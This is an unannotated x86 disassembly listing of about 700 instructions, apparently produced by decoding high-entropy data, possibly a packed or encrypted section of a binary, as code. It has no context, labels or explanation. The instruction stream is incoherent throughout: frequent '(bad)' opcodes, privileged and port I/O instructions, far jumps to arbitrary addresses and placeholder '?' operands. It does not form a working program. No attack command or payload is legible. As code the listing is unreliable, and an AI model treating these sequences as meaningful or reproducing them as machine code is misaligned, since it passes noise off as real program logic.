  4124e4:	shr    DWORD PTR [ebp+0x5a292f36],0x49
  4124eb:	(bad)
  4124ee:	jl     0x412549
  4124f0:	sbb    ecx,DWORD PTR es:[ebx-0x54]
  4124f4:	aam    0x31
  4124f6:	fmul   st,st(2)
  4124f8:	ss mov ecx,0x9ac3aa62
  4124fe:	not    BYTE PTR [ebx]
  412500:	push   ebp
  412501:	xor    esp,DWORD PTR [edx]
  412503:	mov    al,0xbf
  412505:	push   ecx
  412506:	aaa    
  412507:	mov    dh,0x9d
  412509:	mov    ecx,DWORD PTR ds:0xa9112e35
  41250f:	sbb    bh,BYTE PTR [edi+0x52d94425]
  412515:	paddsb mm4,QWORD PTR [ecx]
  412518:	xor    esi,DWORD PTR [edi]
  41251a:	sub    ch,bl
  41251c:	cmc    
  41251d:	cmc    
  41251e:	add    ebp,DWORD PTR [esi+ecx*8-0x139c5678]
  412525:	sub    esp,DWORD PTR [ecx-0x15750aca]
  41252b:	sub    eax,0x93aafde5
  412530:	push   ss
  412531:	repz jmp 0xfb0010c4
  412537:	jge    0x412508
  412539:	sahf   
  41253a:	cmp    eax,eax
  41253c:	ret    0xa797
  41253f:	(bad)  
  412540:	and    BYTE PTR [ecx+0x51],0xea
  412544:	fisubr DWORD PTR [esi]
  412546:	aaa    
  412547:	out    0x9,al
  412549:	cmp    ebx,DWORD PTR [eax]
  41254b:	mov    edx,0xf1951206
  412550:	push   ds
  412551:	or     edi,edi
  412553:	pop    ds
  412554:	mov    DWORD PTR [ecx],edi
  412556:	jle    0x41252e
  412558:	push   0xffffff9e
  41255a:	dec    ecx
  41255b:	(bad)  
  41255c:	aad    0x16
  41255e:	fisub  DWORD PTR [ebx-0x69]
  412561:	xor    ebx,edx
  412563:	aaa    
  412564:	das    
  412565:	mov    ecx,ebx
  412567:	mov    edx,0x5781a8ff
  41256c:	stos   BYTE PTR es:[edi],al
  41256d:	xor    bh,0xd2
  412570:	and    eax,0x6527e61a
  412575:	dec    esp
  412576:	add    esp,DWORD PTR [eax+ebx*2+0x5c]
  41257a:	pushf  
  41257b:	inc    ecx
  41257c:	pop    edx
  41257d:	mov    edi,eax
  41257f:	jmp    0x7850:0x8ee0e1fe
  412586:	xor    BYTE PTR [eax+edx*1-0x73],0xeb
  41258b:	pop    ecx
  41258c:	cmp    al,0x4a
  41258e:	repz dec ecx
  412590:	stc    
  412591:	retf   
  412592:	push   esi
  412593:	xchg   ebx,eax
  412594:	xor    DWORD PTR [edx+0x77827a3f],esp
  41259a:	test   eax,0x41ba00f1
  41259f:	rol    DWORD PTR [esi+0x55],0xe6
  4125a3:	sub    DWORD PTR [ecx+eiz*2-0x3c],esi
  4125a7:	leave  
  4125a8:	ret    
  4125a9:	leave  
  4125aa:	xor    edx,DWORD PTR [esi-0x5c]
  4125ad:	mov    WORD PTR [ecx+edx*8],?
  4125b0:	ja     0x412615
  4125b2:	fisttp QWORD PTR [ebx+0x7b152b4f]
  4125b8:	outs   dx,BYTE PTR ds:[esi]
  4125b9:	and    esp,DWORD PTR [ebx-0x37]
  4125bc:	mov    ebp,0xe6573b7
  4125c1:	dec    ebx
  4125c2:	pop    ecx
  4125c3:	sbb    DWORD PTR [ebx+0x39],edi
  4125c6:	push   ecx
  4125c7:	and    bl,0x1d
  4125ca:	or     eax,DWORD PTR [edx-0x48]
  4125cd:	jl     0x4125b9
  4125cf:	lea    edi,[esi+0x36]
  4125d2:	repnz retfw 
  4125d5:	adc    bh,ch
  4125d7:	mov    ch,0xc0
  4125d9:	fisubr DWORD PTR [eax]
  4125db:	jnp    0x41262f
  4125dd:	sbb    ebp,eax
  4125df:	xchg   ebx,esi
  4125e1:	xchg   esi,ebx
  4125e3:	fsincos 
  4125e5:	fcom   DWORD PTR [ebp+0x4ab795e]
  4125eb:	xchg   edx,eax
  4125ec:	sbb    DWORD PTR [edi-0x2f],0xe623c756
  4125f3:	aas    
  4125f4:	ins    DWORD PTR es:[edi],dx
  4125f5:	and    DWORD PTR [ebp+0x3c207f67],ebp
  4125fb:	jle    0x412594
  4125fd:	bnd jne 0x4125e8
  412600:	xor    DWORD PTR [ebp-0x62],esp
  412603:	pop    ss
  412604:	ss icebp 
  412606:	and    ch,BYTE PTR [edi]
  412608:	popa   
  412609:	lahf   
  41260a:	repnz cmp BYTE PTR ds:0x1fc3e420,0x6
  412612:	pop    es
  412613:	jge    0x4125f6
  412615:	adc    bh,BYTE PTR [edx]
  412617:	or     DWORD PTR [esi+edx*2],0x9434de57
  41261e:	cdq    
  41261f:	aaa    
  412620:	aad    0x11
  412622:	adc    ecx,DWORD PTR [edi+0x1c]
  412625:	leave  
  412626:	stc    
  412627:	mov    dh,BYTE PTR [ebx+0x54]
  41262a:	inc    eax
  41262b:	sub    DWORD PTR [ebp+0x2e],edx
  41262e:	loope  0x41269e
  412630:	fsub   QWORD PTR [esi+0x56b482c1]
  412636:	dec    esi
  412637:	aaa    
  412638:	pop    esp
  412639:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41263a:	rcl    DWORD PTR [ebp-0x12],1
  41263d:	pop    ebp
  41263e:	or     bh,BYTE PTR [edx]
  412640:	jbe    0x41269b
  412642:	mov    ebx,0x2aa1d481
  412647:	int    0xd5
  412649:	out    dx,al
  41264a:	cmp    esp,ebx
  41264c:	dec    edi
  41264d:	add    esi,0xffffffdc
  412650:	(bad)  
  412651:	call   0xdd035f84
  412656:	xor    eax,0xb491aca8
  41265b:	mov    ah,0x8a
  41265d:	add    al,0xf6
  41265f:	in     al,dx
  412660:	or     eax,0x6bb4046a
  412665:	adc    edx,DWORD PTR [eax]
  412667:	xlat   BYTE PTR ds:[ebx]
  412668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412669:	(bad)  
  41266a:	call   0x4ff9f349
  41266f:	adc    ebx,edi
  412671:	test   eax,ebx
  412673:	arpl   WORD PTR [edx-0x17f22664],sp
  412679:	arpl   WORD PTR ds:0xc0d64c5b,si
  41267f:	lods   eax,DWORD PTR ds:[esi]
  412680:	mov    edi,0xd8af8abe
  412685:	sub    ecx,ebx
  412687:	mov    esp,0x45e5cc73
  41268c:	lods   eax,DWORD PTR ds:[esi]
  41268d:	inc    esp
  41268e:	mov    bl,0xb5
  412690:	dec    eax
  412691:	test   eax,0xe48ac560
  412696:	cmp    DWORD PTR [eax+0x77ff8aff],0x49
  41269d:	xchg   BYTE PTR [edi-0x1b],al
  4126a0:	sahf   
  4126a1:	jl     0x4126c4
  4126a3:	imul   edi,DWORD PTR [ebp+0x47],0x47
  4126a7:	adc    eax,0x7914aa91
  4126ac:	push   edx
  4126ad:	dec    esi
  4126ae:	jp     0x4126cb
  4126b0:	inc    esi
  4126b1:	int    0x8f
  4126b3:	and    DWORD PTR [ebp-0x15],edi
  4126b6:	daa    
  4126b7:	mov    ds:0xf5380daa,al
  4126bc:	rcl    DWORD PTR [esi-0x14],1
  4126bf:	pop    edx
  4126c0:	test   BYTE PTR [eax-0x19],ah
  4126c3:	pushf  
  4126c4:	adc    BYTE PTR [ebx+ecx*2+0x1fe3d97b],dh
  4126cb:	push   ds
  4126cc:	lea    ebx,[edi+0x4b]
  4126cf:	mov    edx,DWORD PTR [ecx]
  4126d1:	xor    ch,ah
  4126d3:	mov    edi,0x7d87d295
  4126d8:	and    al,0x2a
  4126da:	mov    ch,0xd4
  4126dc:	(bad)  
  4126dd:	mov    eax,0x466cba3e
  4126e2:	xchg   BYTE PTR [edx-0x3fe0b7ff],ah
  4126e8:	nop
  4126e9:	mov    cl,0x45
  4126eb:	xchg   ebx,eax
  4126ec:	push   ss
  4126ed:	xchg   BYTE PTR [ebx-0x53],bh
  4126f0:	inc    edx
  4126f1:	aad    0x1
  4126f3:	pop    ecx
  4126f4:	xchg   ebp,eax
  4126f5:	jns    0x4126f5
  4126f7:	test   al,0x5e
  4126f9:	push   0xc45d5cbd
  4126fe:	sub    DWORD PTR ss:[ebx],esi
  412701:	push   edi
  412702:	loope  0x41274a
  412704:	fwait
  412705:	lds    edi,FWORD PTR [edx-0x61]
  412708:	or     al,0x66
  41270a:	retf   0x327e
  41270d:	xor    al,0x88
  41270f:	jns    0x4126a3
  412711:	int    0x87
  412713:	and    DWORD PTR [ebx+0x2ebd219a],edi
  412719:	mov    edx,0xe09b0ed6
  41271e:	inc    ebp
  41271f:	cmp    DWORD PTR [edi],esp
  412721:	and    cl,BYTE PTR [esi-0x4bd10bc8]
  412727:	mov    ah,0x5
  412729:	fcomp  DWORD PTR [edx]
  41272b:	icebp  
  41272c:	add    bl,BYTE PTR [esi+0x20]
  41272f:	(bad)  
  412730:	fwait
  412731:	mov    al,0xc7
  412733:	cvtps2pd xmm7,QWORD PTR [esp+ebp*4+0xe67ba5d]
  41273b:	and    eax,0x71319b2
  412740:	push   ds
  412741:	mov    al,0xc8
  412743:	mov    bl,BYTE PTR [ebp+0x63e20d86]
  412749:	xchg   esp,eax
  41274a:	pop    esp
  41274b:	dec    edi
  41274c:	mov    ecx,0x819e8553
  412751:	jmp    0x9c31:0x7cf0e2ea
  412758:	and    al,BYTE PTR [ecx+0x62]
  41275b:	retf   0x3b8c
  41275e:	xor    eax,0x9680235b
  412763:	popf   
  412764:	mov    bl,0xf5
  412766:	xchg   ebp,eax
  412767:	xor    al,0xcf
  412769:	adc    BYTE PTR [edi],cl
  41276b:	xor    dh,BYTE PTR [edx-0x452d7c8]
  412771:	std    
  412772:	xor    edi,DWORD PTR [ebp-0x4a8438c0]
  412778:	fdivr  st(1),st
  41277a:	rcr    BYTE PTR [esi+0x7f4f4c02],1
  412780:	aam    0x8b
  412782:	inc    edx
  412783:	popf   
  412784:	or     eax,0xf8da9e37
  412789:	icebp  
  41278a:	out    dx,eax
  41278b:	xchg   edx,eax
  41278c:	fist   DWORD PTR [edi+0x75]
  41278f:	push   ecx
  412790:	add    cl,BYTE PTR [edx-0x10]
  412793:	mov    edi,ebx
  412795:	mov    dh,cl
  412797:	xor    cl,al
  412799:	(bad)  
  41279a:	or     eax,0x1a5b4f6d
  41279f:	jp     0x41281e
  4127a1:	sbb    eax,DWORD PTR [ebp-0x44]
  4127a4:	mov    ss,WORD PTR [ebx+0x7f23c814]
  4127aa:	and    BYTE PTR [eax],al
  4127ac:	and    eax,0xf9d7626f
  4127b1:	push   es
  4127b2:	inc    eax
  4127b3:	or     eax,0xf94c16b6
  4127b8:	(bad)  
  4127ba:	ds xor eax,0xea67dec
  4127c0:	aaa    
  4127c1:	mov    eax,0x29c03493
  4127c6:	shl    BYTE PTR [eax+eax*4],1
  4127c9:	fdivrp st(7),st
  4127cb:	jns    0x412767
  4127cd:	repnz repnz push 0x49175e6c
  4127d4:	popf   
  4127d5:	lods   al,BYTE PTR ds:[esi]
  4127d6:	shl    DWORD PTR [ebx],1
  4127d8:	inc    edi
  4127d9:	sub    eax,0x6cc9b849
  4127de:	or     eax,0x7d2899c3
  4127e3:	xlat   BYTE PTR ds:[ebx]
  4127e4:	add    BYTE PTR [edi-0x93e6879],ah
  4127ea:	xor    bl,BYTE PTR [ecx+0x35]
  4127ed:	retf   
  4127ee:	cwde   
  4127ef:	mul    DWORD PTR [eax]
  4127f1:	sub    eax,0xf440f106
  4127f6:	cli    
  4127f7:	jmpw   0x8a64
  4127fb:	enter  0x4891,0x4b
  4127ff:	sahf   
  412800:	push   0x2f
  412802:	cdq    
  412803:	xchg   edi,eax
  412804:	xchg   ebx,eax
  412805:	and    al,BYTE PTR [esi-0xc5405b0]
  41280b:	and    al,0xa3
  41280d:	aas    
  41280e:	repnz stos DWORD PTR es:[edi],eax
  412810:	inc    esp
  412811:	outs   dx,BYTE PTR ds:[esi]
  412812:	sub    BYTE PTR [ecx+ecx*2+0x649982f0],0x55
  41281a:	mov    BYTE PTR [ecx+0x77],dh
  41281d:	xor    dl,BYTE PTR [ecx-0x24]
  412820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412821:	ret    
  412822:	xchg   esp,eax
  412823:	ror    BYTE PTR [ecx+0x6b],cl
  412826:	or     DWORD PTR [esi+0x67],edx
  412829:	test   BYTE PTR [ebx+0x679c7f55],cl
  41282f:	mov    es,WORD PTR ds:0x6554e42c
  412835:	clc    
  412836:	into   
  412837:	mov    al,0xe3
  412839:	cmp    BYTE PTR [eax+0x17],bh
  41283c:	sub    BYTE PTR [ebp-0x8],cl
  41283f:	xchg   esp,eax
  412840:	bound  edi,QWORD PTR [edx+edx*4-0x6bad525]
  412847:	jb     0x4128a4
  412849:	mov    BYTE PTR [esi+0x4481cca3],ah
  41284f:	inc    esp
  412850:	es mov ds,ecx
  412853:	std    
  412854:	(bad)  
  412855:	add    BYTE PTR [ebx],al
  412857:	xchg   edx,eax
  412858:	xor    bl,BYTE PTR [ecx+0x147218d8]
  41285e:	push   edi
  41285f:	mov    WORD PTR [ebp+0x7f85740e],?
  412865:	and    BYTE PTR [ebp-0x21f32623],dl
  41286b:	stos   DWORD PTR es:[edi],eax
  41286c:	or     DWORD PTR [eax],edx
  41286e:	repz das 
  412870:	jo     0x412816
  412872:	sub    BYTE PTR [edx],dl
  412874:	(bad)  
  412875:	push   ss
  412876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412877:	add    BYTE PTR [ebx-0x32],0xa2
  41287b:	sub    al,0xfa
  41287d:	not    BYTE PTR [esp+eax*1-0x1dc45b21]
  412884:	dec    ecx
  412885:	xor    ah,cl
  412887:	dec    sp
  412889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41288a:	xor    eax,0x8f128183
  41288f:	xor    eax,0xa390ab20
  412894:	jmp    0x4128c6
  412896:	mov    al,0x5f
  412898:	push   ds
  412899:	mov    al,ds:0x6e4761d4
  41289e:	pop    esi
  41289f:	enter  0x1797,0x69
  4128a3:	xchg   ebp,eax
  4128a4:	fdiv   QWORD PTR [esi]
  4128a6:	fadd   st(4),st
  4128a8:	mov    al,ds:0xf90c2a0b
  4128ad:	adc    al,0xec
  4128af:	inc    ebp
  4128b0:	xor    ebx,esi
  4128b2:	aaa    
  4128b3:	sub    eax,0x3c10bc5
  4128b8:	dec    ebx
  4128b9:	sbb    bl,BYTE PTR [eax+0x595c45a1]
  4128bf:	lods   al,BYTE PTR cs:[esi]
  4128c1:	rcr    edx,cl
  4128c3:	mov    eax,ds:0xd0dc2646
  4128c8:	cmp    DWORD PTR [edi],ebp
  4128ca:	dec    ebp
  4128cb:	xchg   esi,eax
  4128cc:	call   0xc5822b4c
  4128d1:	xlat   BYTE PTR ds:[ebx]
  4128d2:	aas    
  4128d3:	adc    al,0xfd
  4128d5:	mov    dh,0x40
  4128d7:	jp     0x41294b
  4128d9:	push   0x28
  4128db:	pop    ss
  4128dc:	outs   dx,BYTE PTR ds:[esi]
  4128dd:	mov    edx,0xe6313eea
  4128e2:	iret   
  4128e3:	xor    al,0xd
  4128e5:	or     eax,0x5465dce1
  4128ea:	pop    edi
  4128eb:	xor    eax,0xe9080e73
  4128f0:	ror    esp,0x4c
  4128f3:	fcomp  DWORD PTR [edx-0x43]
  4128f6:	jns    0x412925
  4128f8:	sti    
  4128f9:	mov    cs,WORD PTR [ecx-0x61]
  4128fc:	rcr    BYTE PTR [ecx],1
  4128fe:	jecxz  0x412974
  412900:	daa    
  412901:	sub    edx,DWORD PTR [esp+ebx*8-0x724d4844]
  412908:	popf   
  412909:	cwde   
  41290a:	lods   al,BYTE PTR ds:[esi]
  41290b:	xchg   edi,eax
  41290c:	jle    0x412951
  41290e:	fdivr  QWORD PTR [ebp-0x4c]
  412912:	cmp    DWORD PTR [esi],esi
  412914:	rol    DWORD PTR [eax+eiz*2+0x1c607ddd],0x97
  41291c:	xlat   BYTE PTR ds:[ebx]
  41291d:	sbb    eax,0xce49bdcc
  412922:	xchg   dl,dl
  412924:	stos   DWORD PTR es:[edi],eax
  412925:	cmp    esp,DWORD PTR ds:0xf9efd6da
  41292b:	into   
  41292c:	sbb    al,0xa8
  41292e:	xchg   edi,eax
  41292f:	xchg   ebp,eax
  412930:	dec    esp
  412931:	loop   0x4128c4
  412933:	push   esp
  412934:	cwde   
  412935:	sub    bh,ch
  412937:	(bad)  
  412938:	scas   al,BYTE PTR es:[edi]
  412939:	dec    edi
  41293a:	cld    
  41293b:	mov    dh,0xa3
  41293d:	in     al,dx
  41293e:	mov    edx,DWORD PTR [edi]
  412940:	cli    
  412941:	cli    
  412942:	call   0x8d24ad09
  412947:	dec    ebx
  412948:	push   esi
  412949:	xor    esp,DWORD PTR [esi+0x155a589f]
  41294f:	in     eax,0x17
  412951:	enter  0x26ff,0xae
  412955:	push   0x34
  412957:	push   cs
  412958:	xor    edx,0xffffffd8
  41295b:	call   0x9693002e
  412960:	mov    eax,0x355ceeab
  412965:	lods   al,BYTE PTR ds:[esi]
  412966:	xlat   BYTE PTR ds:[ebx]
  412967:	clc    
  412968:	and    BYTE PTR [ebp+edi*2+0x2788abcc],0xcf
  412970:	retf   
  412971:	addr16 pop ss
  412973:	popa   
  412974:	push   esi
  412975:	or     BYTE PTR [edi+0x7367c359],bl
  41297b:	cmp    ebp,DWORD PTR [esi+0x7e]
  41297e:	or     eax,0x77aa46f6
  412983:	pushf  
  412984:	out    0x3b,eax
  412986:	lock fmul QWORD PTR [esi]
  412989:	sub    al,0x10
  41298b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41298c:	cwde   
  41298d:	inc    eax
  41298e:	push   esi
  41298f:	pop    ecx
  412990:	pusha  
  412991:	repz std 
  412993:	fidivr DWORD PTR [esi-0x6a]
  412996:	iret   
  412997:	cmp    ch,bl
  412999:	shl    DWORD PTR [esi],0xeb
  41299c:	push   eax
  41299d:	ret    
  41299e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41299f:	jmp    0x412956
  4129a1:	pop    edi
  4129a2:	lods   eax,DWORD PTR ds:[esi]
  4129a3:	mov    esi,0xfeef7589
  4129a8:	xchg   esp,eax
  4129a9:	icebp  
  4129aa:	sbb    al,0x4d
  4129ac:	mov    edi,0x99a830c6
  4129b1:	push   cs
  4129b2:	mov    ds:0xfc0dcac8,eax
  4129b7:	mov    cl,0x4d
  4129b9:	lock xor cl,bh
  4129bc:	sub    edx,DWORD PTR [ebx-0x522fbaae]
  4129c2:	enter  0x5dbb,0x1f
  4129c6:	aad    0x90
  4129c8:	xchg   edi,ecx
  4129ca:	cdq    
  4129cb:	add    DWORD PTR [edx-0x36d07563],edi
  4129d1:	sub    eax,0x586040f9
  4129d6:	repnz aam 0x24
  4129d9:	mov    dh,0x78
  4129db:	mov    al,ds:0x105202c3
  4129e0:	xlat   BYTE PTR ds:[ebx]
  4129e1:	neg    BYTE PTR [ecx+0x60419116]
  4129e7:	xchg   ecx,eax
  4129e8:	jmp    0x1c44:0x5b9ea913
  4129ef:	add    DWORD PTR ds:0x28369c03,eax
  4129f5:	add    al,0xc4
  4129f7:	push   0xffffff9b
  4129f9:	sbb    al,0x39
  4129fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129fc:	aas    
  4129fd:	jnp    0x4129c7
  4129ff:	fcmovb st,st(1)
  412a01:	xchg   ebp,eax
  412a02:	cmp    al,0xa8
  412a04:	idiv   BYTE PTR [edi]
  412a06:	xchg   ebp,eax
  412a07:	std    
  412a08:	xor    al,0x91
  412a0a:	or     al,0x66
  412a0c:	mov    bl,0xe9
  412a0e:	cld    
  412a0f:	in     al,dx
  412a10:	pushf  
  412a11:	or     BYTE PTR [ebp-0x1d5f6c7e],ah
  412a17:	scas   al,BYTE PTR es:[edi]
  412a18:	push   ds
  412a19:	ja     0x4129e2
  412a1b:	pop    edx
  412a1c:	inc    ebp
  412a1d:	in     al,dx
  412a1e:	mov    eax,ds:0xd8abf158
  412a23:	dec    edx
  412a24:	into   
  412a25:	icebp  
  412a26:	push   0x1e
  412a28:	mov    dh,0x20
  412a2a:	mov    eax,ds:0x82ecc0d0
  412a2f:	mov    al,ds:0xbdf0d98
  412a34:	fwait
  412a35:	pop    ss
  412a36:	sub    eax,0xa18f2ed1
  412a3b:	inc    edi
  412a3c:	cdq    
  412a3d:	ret    
  412a3e:	adc    bl,al
  412a40:	xor    esp,DWORD PTR [edi]
  412a42:	das    
  412a43:	pop    ebx
  412a44:	jge    0x412a2c
  412a46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a47:	adc    BYTE PTR [ebx+edx*8],0xf6
  412a4b:	cld    
  412a4c:	mul    BYTE PTR [ecx-0x996ff0c]
  412a52:	mov    edx,0x990cd83b
  412a57:	sar    BYTE PTR [esi+0x61a356a],cl
  412a5d:	mov    ds:0x301e61dd,eax
  412a62:	xchg   ebp,eax
  412a63:	fprem  
  412a65:	mov    bh,0x45
  412a67:	fwait
  412a68:	int3   
  412a69:	shl    BYTE PTR [eax],cl
  412a6b:	xor    eax,0x914a0f43
  412a70:	jno    0x412aa8
  412a72:	shl    bh,1
  412a74:	fidiv  WORD PTR [edi]
  412a76:	sbb    DWORD PTR [ecx-0x2a],ebp
  412a79:	(bad)  
  412a7a:	retf   
  412a7b:	add    eax,0x3d560785
  412a80:	pop    esp
  412a81:	cdq    
  412a82:	adc    DWORD PTR [ebp-0x5cd213b8],0xffffffe8
  412a89:	aam    0x5a
  412a8b:	hlt    
  412a8c:	jne    0x412afb
  412a8e:	adc    al,0xfe
  412a90:	pop    ebx
  412a91:	sahf   
  412a92:	and    eax,0x6fde4df0
  412a97:	int    0xf2
  412a99:	adc    dl,dl
  412a9b:	out    0xfa,al
  412a9d:	(bad)  
  412a9e:	mov    eax,DWORD PTR [edi]
  412aa0:	repz xor eax,0x66e91983
  412aa6:	adc    al,0x76
  412aa8:	jg     0x412a2e
  412aaa:	mov    al,0x4c
  412aac:	dec    eax
  412aad:	mov    eax,0xb448cf3f
  412ab2:	jle    0x412ac8
  412ab4:	inc    edi
  412ab5:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  412ab7:	mov    esp,0x677a79fc
  412abc:	cmc    
  412abd:	lock xchg esi,eax
  412abf:	xlat   BYTE PTR ds:[ebx]
  412ac0:	gs push edx
  412ac2:	repnz xchg esp,eax
  412ac4:	int    0x78
  412ac6:	imul   ebx,DWORD PTR [ebx+0x1ef5aa78],0x6e1b6203
  412ad0:	ficomp DWORD PTR [edx-0x3ef2b02]
  412ad6:	cmp    ecx,ecx
  412ad8:	jne    0x412b03
  412ada:	sar    BYTE PTR [edi],cl
  412adc:	xchg   ebx,eax
  412add:	(bad)  
  412ade:	out    0xdb,al
  412ae0:	inc    esi
  412ae1:	fimul  WORD PTR [edi+0x443fd9e0]
  412ae7:	xchg   ecx,eax
  412ae8:	jae    0x412b5e
  412aea:	outs   dx,BYTE PTR ds:[esi]
  412aeb:	cmp    BYTE PTR [esi],0x73
  412aee:	imul   esi,DWORD PTR [eax-0x55332c19],0xcf26b692
  412af8:	into   
  412af9:	sub    ah,BYTE PTR [esi+0x32011822]
  412aff:	add    ch,bl
  412b01:	fdiv   DWORD PTR [edx+0x59]
  412b04:	or     bh,ch
  412b06:	lods   al,BYTE PTR ds:[esi]
  412b07:	dec    esp
  412b08:	daa    
  412b09:	jle    0x412b06
  412b0b:	scas   eax,DWORD PTR es:[edi]
  412b0c:	sub    DWORD PTR [edx-0x29],ebx
  412b0f:	call   0x45b2:0xd63b855e
  412b16:	cmp    BYTE PTR [edi],0xef
  412b19:	xchg   eax,esp
  412b1b:	ja     0x412acf
  412b1d:	in     eax,dx
  412b1e:	scas   al,BYTE PTR es:[edi]
  412b1f:	mov    ds:0x3026e4f8,eax
  412b24:	imul   esi,DWORD PTR [eax],0x74
  412b27:	adc    BYTE PTR [ebp-0x108e0129],dh
  412b2d:	dec    ebx
  412b2e:	and    ecx,esi
  412b30:	and    eax,0xc892fd32
  412b35:	js     0x412ace
  412b37:	cmp    bh,BYTE PTR [ebp+0x68]
  412b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b3b:	jns    0x412b3d
  412b3d:	mov    bl,0xa0
  412b3f:	mov    ch,0x24
  412b41:	xchg   ebp,eax
  412b42:	jle    0x412acd
  412b44:	std    
  412b45:	xor    eax,0x7fad8f94
  412b4a:	jbe    0x412b2f
  412b4c:	jb     0x412b94
  412b4e:	cmp    DWORD PTR [esp+ebx*4+0x35],edx
  412b52:	sbb    eax,0x44efd6c5
  412b57:	inc    edi
  412b58:	mov    DWORD PTR [edx+0x64122bf2],0x9dcc1137
  412b62:	bound  eax,QWORD PTR [ebp+0x3a71248a]
  412b68:	out    dx,eax
  412b69:	addr16 into 
  412b6b:	loop   0x412b52
  412b6d:	fucomp st(0)
  412b6f:	add    BYTE PTR [ebx],ah
  412b71:	pop    ebx
  412b72:	pop    es
  412b73:	sahf   
  412b74:	dec    edi
  412b75:	test   BYTE PTR [esi],bh
  412b77:	pop    DWORD PTR [eax-0x76e9b0a8]
  412b7d:	rcl    DWORD PTR [ebp-0x41],1
  412b80:	fs or  edx,0x58c880f9
  412b87:	cmp    eax,0xb3ba5dba
  412b8c:	pop    ebx
  412b8d:	xchg   ebp,eax
  412b8e:	int    0x49
  412b90:	aam    0x2c
  412b92:	mov    WORD PTR [eax+0x134910c5],?
  412b98:	cmc    
  412b99:	mov    ebx,0x2497b9e9
  412b9e:	es jno 0x412b99
  412ba1:	cmp    eax,0xc26efb3c
  412ba6:	pop    ebp
  412ba7:	shl    bh,1
  412ba9:	jns    0x412bf6
  412bab:	cmp    ebx,DWORD PTR [ebx]
  412bad:	std    
  412bae:	and    esp,esi
  412bb0:	loope  0x412c00
  412bb2:	push   cs
  412bb3:	xor    DWORD PTR [esi],0xa
  412bb6:	out    0x6c,eax
  412bb8:	ror    BYTE PTR [esi],1
  412bba:	jne    0x412b54
  412bbc:	mov    bh,0xb2
  412bbe:	repnz mov esi,DWORD PTR [ebx-0x5345c989]
  412bc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bc6:	and    eax,0xd954e0c2
  412bcb:	adc    DWORD PTR [edx+0x387624fb],0x27f27f68
  412bd5:	xchg   esp,eax
  412bd6:	rcl    ebp,1
  412bd8:	xchg   ebx,eax
  412bd9:	jl     0x412c08
  412bdb:	mov    gs,WORD PTR [edi-0x16ae0dd4]
  412be1:	and    cl,BYTE PTR [ecx+0x73]
  412be4:	and    BYTE PTR [esi],0x2b
  412be7:	popf   
  412be8:	fst    st(1)
  412bea:	sub    bl,bh
  412bec:	mov    esp,0x6fe5d2d5
  412bf1:	test   dl,bl
  412bf3:	mov    ch,0xc5
  412bf5:	data16 jge 0x412bf9
  412bf8:	xchg   edi,eax
  412bf9:	cmp    al,0x54
  412bfb:	jle    0x412c75
  412bfd:	pusha  
  412bfe:	loop   0x412bc9
  412c00:	jl     0x412c80
  412c02:	dec    eax
  412c03:	add    DWORD PTR [eax+0x7b8bebd0],eax
  412c09:	jbe    0x412c59
  412c0b:	out    0xf3,al
  412c0d:	jnp    0x412bb3
  412c0f:	rol    BYTE PTR [ebx],0xc5
  412c12:	imul   esi,ebp,0x5acfedc5
  412c18:	add    BYTE PTR [edx+0x14edeace],cl
  412c1e:	pusha  
  412c1f:	pop    esi
  412c20:	call   0x50f3:0x4a76383d
  412c27:	(bad)  
  412c28:	xchg   ecx,eax
  412c29:	inc    eax
  412c2b:	sti    
  412c2c:	xchg   DWORD PTR [edi-0x49],edx
  412c2f:	out    dx,eax
  412c30:	gs out 0xeb,eax
  412c33:	dec    ebx
  412c34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c35:	or     dh,dl
  412c37:	(bad)  
  412c38:	div    esi
  412c3a:	popa   
  412c3b:	push   eax
  412c3c:	aas    
  412c3d:	xchg   esi,eax
  412c3e:	jae    0x412c0d
  412c40:	dec    ebx
  412c41:	xor    edi,ebp
  412c43:	out    0x87,eax
  412c45:	cwde   
  412c46:	nop
  412c47:	sbb    ch,BYTE PTR [edi+0x66a15dfa]
  412c4d:	out    dx,al
  412c4e:	test   eax,0x8457d4bb
  412c53:	retf   0xde9a
  412c56:	or     bl,BYTE PTR [edi]
  412c58:	call   0xe374:0xad4cae24
  412c5f:	mov    esp,0x35333e1a
  412c64:	mov    DWORD PTR [edx],eax
  412c66:	fld    QWORD PTR [esi-0x16]
  412c69:	xlat   BYTE PTR ds:[ebx]
  412c6a:	mov    esi,DWORD PTR [esi+0x61]
  412c6d:	das    
  412c6e:	add    eax,0xd99c7100
  412c73:	xor    esp,DWORD PTR [ecx]
  412c75:	and    BYTE PTR [ecx-0x7048efe4],bl
  412c7b:	push   ebp
  412c7c:	nop
  412c7d:	fimul  DWORD PTR [esi+0x5f]
  412c80:	xor    eax,0x5a8cce55
  412c85:	push   0xd3d0e100
  412c8a:	xchg   edx,eax
  412c8b:	mov    BYTE PTR [edx+0x3f],0xfa
  412c8f:	or     bl,dl
  412c91:	xchg   edx,eax
  412c92:	mov    ebx,DWORD PTR [ecx-0xe0ccb6]
  412c98:	test   dh,0xee
  412c9b:	and    ebp,0xffffffa9
  412c9e:	in     al,dx
  412c9f:	and    DWORD PTR [eax-0x77],0xffffff8b
  412ca3:	in     eax,0x12
  412ca5:	mov    ?,esi
  412ca7:	xlat   BYTE PTR ds:[ebx]
  412ca8:	out    0x4f,al
  412caa:	dec    eax
  412cab:	or     DWORD PTR [ebx-0x48],0xffffffe3
  412caf:	imul   esp,DWORD PTR [ecx+0x29a39915],0x55ab291b
  412cb9:	xor    BYTE PTR [ecx-0x380a49ec],0xae
  412cc0:	jle    0x412d22
  412cc2:	and    eax,0xa1a35e25
  412cc7:	adc    al,0x1a
  412cc9:	loope  0x412d47
  412ccb:	shr    dl,cl
  412ccd:	mov    eax,ss:0xc7751c1
  412cd3:	aaa    
